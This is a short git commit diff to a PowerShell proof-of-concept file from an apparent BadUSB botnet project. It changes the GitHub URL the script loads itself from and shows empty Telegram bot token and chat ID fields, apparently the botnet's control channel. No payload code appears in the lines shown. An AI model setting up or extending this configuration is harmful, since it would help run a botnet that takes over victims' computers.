948004dd6101a25bdfbdcbcf4f81588ebf05dffc
LauncherTV2 <115373778+LauncherTV2@users.noreply.github.com>
2023-03-08 18:13:53 +0100

    Update poc.ps1

--- poc.ps1
+++ poc.ps1
@@ -21,7 +21,7 @@ BOT TELEGRAM:
 
 $BotToken = ""
 $ChatID = ''
-$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
+$githubScript = 'https://github.com/LauncherTV2/badusb_botnet/blob/master/poc.ps1'
 
 
 ###############
